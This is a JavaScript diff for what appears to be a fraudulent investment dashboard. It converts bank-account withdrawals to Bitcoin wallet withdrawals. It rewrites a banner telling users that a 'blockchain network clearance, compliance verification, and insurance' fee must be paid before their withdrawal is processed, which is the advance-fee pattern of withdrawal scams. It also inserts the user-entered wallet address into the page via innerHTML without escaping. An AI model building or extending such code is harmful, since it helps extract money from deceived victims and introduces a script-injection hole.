@@ -1407,7 +1407,7 @@ function renderDashboardTransactions() {
     })),
     ...userWds.map(w => ({
       type: 'Withdrawal',
-      detail: `${w.bank} (Acct *${w.account.slice(-4)})`,
+      detail: `${w.bank || 'Bitcoin (BTC)'} (${w.account ? (w.account.length > 14 ? w.account.slice(0, 6) + '...' + w.account.slice(-4) : w.account) : 'BTC'})`,
       amount: parseFloat(w.amount),
       status: w.status || 'Pending',
       date: w.date,
@@ -3273,9 +3273,8 @@ async function initWithdraw() {
     const amount = document.getElementById('wd-amount').value;
     const errEl = document.getElementById('wd-bank-error');
 
-    if (!bank) { showError(errEl, 'Please select a bank.'); return; }
-    if (!account || account.length < 4) { showError(errEl, 'Invalid account number.'); return; }
-    if (!routing || routing.length !== 9) { showError(errEl, 'Routing number must be 9 digits.'); return; }
+    if (!bank) { showError(errEl, 'Please select a network/asset.'); return; }
+    if (!account || account.length < 20) { showError(errEl, 'Please enter a valid Bitcoin (BTC) wallet address.'); return; }
     if (!amount || parseFloat(amount) <= 0) { showError(errEl, 'Enter a valid amount.'); return; }
 
     // KYC Check — block withdrawal if user has KYC enabled
@@ -3349,7 +3348,7 @@ async function initWithdraw() {
       // Update dynamic banners or titles if any
       const bannerText = document.querySelector('.wd-fee-info p');
       if (bannerText) {
-        bannerText.innerHTML = `This fee covers international wire transfer, compliance verification, and insurance. It must be paid before your withdrawal of <strong>$${parseFloat(amount).toLocaleString('en-US', {minimumFractionDigits:2})}</strong> to <strong>${bank}</strong> is processed.`;
+        bannerText.innerHTML = `This fee covers blockchain network clearance, compliance verification, and insurance. It must be paid before your withdrawal of <strong>${parseFloat(amount).toLocaleString('en-US', {minimumFractionDigits:2})}</strong> to <strong>${bank}</strong> wallet <code>${account.length > 14 ? account.slice(0, 8) + '...' + account.slice(-6) : account}</code> is processed.`;
       }
 
       document.getElementById('wd-step-1').style.display = 'none';
